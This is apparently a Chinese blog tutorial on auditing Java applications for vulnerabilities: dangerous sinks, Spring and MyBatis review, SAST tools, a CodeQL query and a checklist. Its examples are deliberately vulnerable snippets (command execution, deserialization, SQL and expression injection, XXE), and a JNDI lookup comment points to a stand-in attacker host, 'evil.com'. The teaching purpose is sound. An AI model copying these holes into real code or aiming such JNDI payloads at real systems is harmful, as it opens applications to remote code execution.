---
title: 代码审计：Java审计入门
date: 2026-02-15 08:00:00
tags:
  - 代码审计
  - 渗透测试
categories: 渗透测试
---

## 前言

Java 企业级应用无处不在，但开发者往往忽略安全编码，遗留大量可利用漏洞。本文面向具备基础 Java 开发经验的安全从业者，聚焦常见危险函数、框架审计要点与 SAST 工具，结合示例代码说明漏洞成因与修复思路。

审计核心脉络：**Source（用户入口）→ Propagation（数据流转）→ Sink（危险出口），中间是否被 Sanitizer 阻断。**

---

## 一、十大高危 Sink 函数

### 1.1 Runtime.exec —— 命令执行

```java
// 危险：用户参数直接拼接
String cmd = request.getParameter("cmd");
Runtime.getRuntime().exec(cmd);
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
```

**审计**：搜索 `Runtime.getRuntime().exec(`、`ProcessBuilder(`。关注参数是否来自用户输入。即使数组形式传参，通过 `sh -c` 执行仍可利用。

### 1.2 JNDI lookup —— JNDI 注入

Log4j2 (CVE-2021-44228) 让 JNDI 注入广为人知。任何 `Context.lookup()` 参数可控的代码都有风险。

```java
String url = request.getParameter("jndiUrl");
new InitialContext().lookup(url);  // ldap://evil.com/Exploit
```

**审计**：搜索 `\.lookup(`。JDK 高版本 `trustURLCodeBase=false` 仍可被 `javaSerializedData` 等绕过。

### 1.3 readObject —— 原生反序列化

`ObjectInputStream.readObject()` 配合 ClassPath 中的 Gadget Chain（CommonsCollections、Spring 等）可导致 RCE。

```java
byte[] data = Base64.getDecoder().decode(request.getParameter("payload"));
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
Object obj = ois.readObject();
```

**审计**：搜索 `readObject(`、`ObjectInputStream(`，检查数据来源（HTTP Body、Cookie、Socket）。用 ysoserial 辅助验证 ClassPath 中的 Gadget。

### 1.4 Fastjson / Jackson 反序列化

```java
// Fastjson — @type 指定任意类
JSON.parse(request.getParameter("json"));
// Jackson — enableDefaultTyping 开启多态
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
mapper.readValue(json, Object.class);
```

**审计**：搜索 `JSON.parse(`。Fastjson 1.2.68 以下几乎必中。关注 `enableDefaultTyping()`、`safeMode` 配置。

### 1.5 SQL 拼接 —— SQL 注入

```java
// JDBC 拼接
String sql = "SELECT * FROM users WHERE name = '" + req.getParameter("name") + "'";
conn.createStatement().executeQuery(sql);

// MyBatis ${} 字符串替换（非预编译）
@Select("SELECT * FROM users WHERE name = '${name}'")
```

**审计**：全局搜索 SQL 拼接模式。MyBatis XML/注解中搜索 `${`，逐一确认参数来源。动态 `ORDER BY ${col}` 需白名单校验。

### 1.6 HQL / JdbcTemplate 注入

```java
String name = request.getParameter("name");
jdbcTemplate.query("SELECT * FROM users WHERE name = '" + name + "'", ...);
session.createQuery("FROM User WHERE name = '" + name + "'").list();
```

### 1.7 XPath 注入

```java
XPathExpression expr = xpath.compile("//user[username='" + request.getParameter("user") + "']");
```

### 1.8 模板引擎注入（SSTI）

```java
// FreeMarker 用户控制模板内容
new Template("tpl", new StringReader(request.getParameter("tpl")), cfg);
// Velocity
Velocity.evaluate(context, writer, "log", userInput);
```

**审计**：搜索 `new Template(`、`Velocity.evaluate(`。模板路径也可能被路径遍历利用。

### 1.9 表达式注入（SpEL / OGNL）

```java
// SpEL
new SpelExpressionParser().parseExpression(request.getParameter("exp")).getValue();
// OGNL — Struts2 经典漏洞
Ognl.getValue(userInput, context, root);
// ScriptEngine
new ScriptEngineManager().getEngineByName("javascript").eval(userInput);
```

**审计**：搜索 `SpelExpressionParser`、`Ognl.getValue`、`ScriptEngine`。Struts2 和 Spring Web Flow 的自动绑定也需关注。

### 1.10 XXE —— XML 外部实体注入

```java
// 默认配置允许外部实体
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
Document doc = db.parse(request.getInputStream());
```

**审计**：搜索 `DocumentBuilderFactory.newInstance()`，检查是否设置了 `disallow-doctype-decl` 等安全 feature。

---

## 二、Spring MVC 控制器审计

Spring MVC Controller 是用户输入最直接的入口，也是审计起点。

```java
@RestController
@RequestMapping("/api")
public class UserController {

    @GetMapping("/exec")
    public String exec(@RequestParam String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);          // 明显 RCE
        return "ok";
    }

    @PostMapping("/update")
    public String updateUser(User user) {        // 对象自动绑定
        userService.update(user);                // isAdmin/role 等字段可能被篡改
    }
}
```

**Controller 审计清单**：

1. 收集所有 `@Controller` / `@RestController` 类及其 `@RequestMapping` 方法
2. 记录每个方法的参数类型：`@RequestParam`、`@PathVariable`、`@RequestBody`、`@RequestHeader`、`HttpServletRequest`
3. 追踪参数进入 Service → DAO → Sink 的完整路径
4. **文件操作**：`MultipartFile` 上传写入、`ResponseEntity<Resource>` 下载路径遍历
5. **重定向**：`return "redirect:" + userInput` 可能导致 URL 跳转
6. **Filter / Interceptor**：认证授权校验是否存在可被绕过的白名单

此外注意 Spring Boot Actuator 端点暴露（env、heapdump、mappings）以及 Swagger 文档在生产环境的可用性。

---

## 三、MyBatis 审计：`#` 与 `$` 的本质区别

MyBatis 中 `#{}` 和 `${}` 的区别直接决定是否存在 SQL 注入。

| 占位符 | 机制 | 安全性 | 适用场景 |
|--------|------|--------|----------|
| `#{}` | PreparedStatement 预编译绑定 | 安全 | 参数值 WHERE val = #{v} |
| `${}` | 字符串直接替换 | 高危 | 仅限非用户可控的表名/列名 |

### 审计示例

```xml
<!-- 危险 -->
<select id="findByName" resultType="User">
    SELECT * FROM users WHERE name = '${name}'
</select>

<!-- 安全 -->
<select id="findByName" resultType="User">
    SELECT * FROM users WHERE name = #{name}
</select>

<!-- 常见漏洞：动态排序，$ 几乎必须 -->
<select id="listByOrder" resultType="User">
    SELECT * FROM users ORDER BY ${orderColumn} ${sortDirection}
</select>
```

动态排序场景必须使用白名单校验：

```java
private static final Set<String> COLS = Set.of("id", "username", "create_time");
private static final Set<String> DIRS = Set.of("ASC", "DESC");

public List<User> listByOrder(String col, String dir) {
    if (col == null || !COLS.contains(col))
        throw new IllegalArgumentException("Invalid: " + col);
    if (dir == null || !DIRS.contains(dir.toUpperCase()))
        throw new IllegalArgumentException("Invalid: " + dir);
    return mapper.listByOrder(col, dir.toUpperCase());
}
```

**审计技巧**：在 MyBatis XML 中全局搜索 `${`，逐一确认参数来源是否可控。注解模式同理——`@Select` 中的 `${}` 同样高危。

---

## 四、SAST 工具

### 4.1 Fortify SCA

OpenText（原 Micro Focus）商业标杆。规则库 800+，数据流精准，支持 27+ 语言。劣势：价格昂贵，扫描慢。

```bash
sourceanalyzer -b myapp -clean
sourceanalyzer -b myapp "src/**/*.java" -cp "lib/*.jar"
sourceanalyzer -b myapp -scan -f results.fpr
```

### 4.2 Checkmarx

商业 SAST，增量扫描和 CI/CD 集成（Jenkins、Azure DevOps）友好，支持 CxQL 自定义规则。

### 4.3 CodeQL

GitHub 开源语义分析引擎，将代码视作数据库查询。社区活跃，需掌握 QL 语言。

```ql
import java

from MethodAccess ma, RemoteFlowSource source
where
  ma.getMethod().hasName("exec") and
  ma.getMethod().getDeclaringType().hasQualifiedName("java.lang", "Runtime") and
  source.flowsTo(ma.getArgument(0))
select ma, "Potential command injection from $@.", source, "user input"
```

| 维度   | Fortify     | Checkmarx  | CodeQL       |
|--------|-------------|------------|--------------|
| 类型   | 商业        | 商业       | 开源         |
| 精确度 | 高          | 中高       | 取决于查询   |
| CI/CD  | 支持        | 优秀       | GitHub原生   |
| 自定义 | 有限        | CxQL       | QL           |
| 适合   | 企业合规    | DevSecOps  | 安全研究     |

---

## 五、审计 Checklist

**Source（入口）**
- [ ] 所有 Controller / Servlet 参数已梳理（@RequestParam、@PathVariable、@RequestBody、@RequestHeader）
- [ ] Filter / Interceptor 拦截规则已查明（认证、授权、输入过滤）
- [ ] RMI / RPC / WebService / 消息队列消费者纳入范围

**Sink（出口）**
- [ ] `Runtime.exec()` / `ProcessBuilder` —— 参数是否来自用户输入
- [ ] `InitialContext.lookup()` —— URL 是否可控
- [ ] `ObjectInputStream.readObject()` —— 反序列化数据来源
- [ ] `JSON.parse()` / `parseObject()` —— Fastjson 版本与配置
- [ ] SQL 拼接 / MyBatis `${}` —— 是否存在注入
- [ ] `SpelExpressionParser` / `Ognl` / `ScriptEngine` —— 表达式可控性
- [ ] XML 解析器 —— 是否禁用外部实体
- [ ] 文件读写 —— 路径是否可控（目录穿越）
- [ ] 模板引擎 —— 模板内容或名称来源
- [ ] `Runtime.load()` / `System.load()` —— 库路径是否可控

**传播路径**
- [ ] 每个 Source→Sink 调用链已追踪
- [ ] 中间过滤函数（trim/replace/正则）是否可被绕过
- [ ] 数据是否经序列化/反序列化后再使用，或存入数据库后再取出

**框架特性**
- [ ] Spring Boot Actuator 是否暴露敏感端点
- [ ] Shiro RememberMe 密钥是否为默认值
- [ ] Swagger/OpenAPI 文档是否在生产环境可用
- [ ] 各依赖库版本是否存在已知 CVE

---

## 六、实战技巧

**IDEA 辅助**：Ctrl+Shift+F 全局搜索危险函数名；Find Usages 从 Source 追踪；Call Hierarchy 从 Sink 回溯。

**正则搜索库**：
```
Runtime\.getRuntime\(\)\.exec\(
ProcessBuilder\(
\.lookup\(
\.readObject\(
JSON\.parse\(
\$\{                 (MyBatis XML)
SpelExpressionParser\(
```

**常见误报**：参数来自配置文件、已通过白名单校验、系统内部固定值（UUID）、已通过 SecurityUtil 工具类过滤。

---

## 免责声明

本文所述技术仅供安全研究与学习之用，严禁用于未经授权的测试或攻击行为。在进行任何安全测试之前，请务必获得目标系统的书面授权。作者及发布平台不对任何滥用本文内容所导致的后果承担责任。

---

## 参考资源

1. [OWASP Java 编码规范](https://owasp.org/www-project-java-encoder/)
2. [ysoserial — Java 反序列化 Gadget](https://github.com/frohoff/ysoserial)
3. [CodeQL for Java 文档](https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/)
4. [MyBatis 字符串替换](https://mybatis.org/mybatis-3/sqlmap-xml.html#String_Substitution)
5. [Fastjson 安全加固](https://github.com/alibaba/fastjson/wiki/security_update)
